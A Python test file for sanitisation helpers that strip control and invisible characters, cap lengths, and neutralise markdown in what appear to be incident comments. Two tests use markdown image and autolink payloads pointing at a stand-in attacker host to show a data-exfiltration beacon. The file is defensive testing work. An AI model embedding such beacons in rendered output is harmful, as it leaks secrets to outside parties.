from src.governance.sanitize import sanitize_comment, scrub_text, scrub_value


def test_scrub_removes_control_and_invisible_characters():
    assert scrub_text("a\x00b\x1fc") == "abc"
    assert scrub_text("hi\u200bthere\u202e") == "hithere"
    assert scrub_text("tab\tnewline\nkept") == "tab\tnewline\nkept"


def test_scrub_caps_cell_length_including_the_marker():
    """The marker used to be appended AFTER the cap, so a scrubbed cell could
    come back longer than the cap the byte budget was computed from."""
    out = scrub_text("x" * 10_000, max_chars=100)
    assert len(out) <= 100
    assert out.startswith("xxxx") and "truncated" in out


def test_scrub_value_is_recursive_and_depth_bounded():
    data = {"a": ["b\x07", {"c": "d\u200b"}]}
    assert scrub_value(data) == {"a": ["b", {"c": "d"}]}
    deep = value = {}
    for _ in range(20):
        value["next"] = {}
        value = value["next"]
    scrub_value(deep)  # must not recurse without bound


def test_scrub_value_also_cleans_dict_keys():
    assert scrub_value({"na\u200bme": "v"}) == {"name": "v"}


def test_comment_image_syntax_is_neutralised():
    """A rendered remote image in an incident comment is an exfil beacon."""
    out = sanitize_comment("look ![](https://attacker.example/?q=secret)")
    assert "![](" not in out
    assert "https://attacker.example" in out  # content preserved, just not rendered


def test_comment_autolink_is_escaped():
    out = sanitize_comment("<https://attacker.example/beacon>")
    assert not out.startswith("<https")


def test_comment_plain_markdown_survives():
    out = sanitize_comment("## Findings\n\n- **high** severity\n- see `SigninLogs`")
    assert "## Findings" in out and "**high**" in out


def test_comment_length_is_capped():
    assert len(sanitize_comment("a" * 50_000, max_chars=100)) == 100
